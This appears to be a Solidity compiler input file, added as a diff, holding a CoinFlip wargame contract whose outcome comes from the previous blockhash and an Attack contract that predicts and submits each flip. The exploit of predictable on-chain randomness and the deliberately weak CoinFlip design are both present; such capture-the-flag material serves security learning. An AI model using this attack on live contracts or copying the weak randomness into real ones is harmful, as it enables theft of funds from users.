@@ -1,0 +1,38 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Attack.sol": {
+      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.0;\n\nimport \"./CoinFlip.sol\";\n\ncontract Attack {\n    uint256 public blockValue;\n    uint256 public FACTOR =\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    uint256 public coinState;\n    address public owner;\n    CoinFlip coinFlip;\n\n    constructor(address _coinFlipAddress) {\n        coinFlip = CoinFlip(_coinFlipAddress);\n    }\n\n    function attack() public {\n        blockValue = uint256(blockhash(block.number - 1));\n        coinState = blockValue / FACTOR;\n\n        if (coinState == 1) {\n            coinFlip.flip(true);\n        } else {\n            coinFlip.flip(false);\n        }\n    }\n}\n"
+    },
+    "contracts/CoinFlip.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR =\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
